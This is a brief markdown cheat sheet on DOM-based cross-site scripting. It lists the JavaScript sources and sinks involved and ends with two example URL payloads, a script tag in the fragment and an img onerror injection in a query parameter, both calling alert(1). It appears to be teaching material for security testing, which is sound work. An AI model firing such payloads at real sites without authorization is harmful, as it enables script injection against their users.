# DOM-Based XSS

## Summary
Client-side JavaScript executes user input from URL/fragment.

## Detection
1. Look for JS using `location.hash`, `location.search`, `document.URL`
2. Identify sinks: `innerHTML`, `document.write`, `eval`, `setTimeout`
3. Craft payload via URL fragment

## Payloads

```
https://site.com/#<script>alert(1)</script>
https://site.com/?name="><img src=x onerror=alert(1)>
```
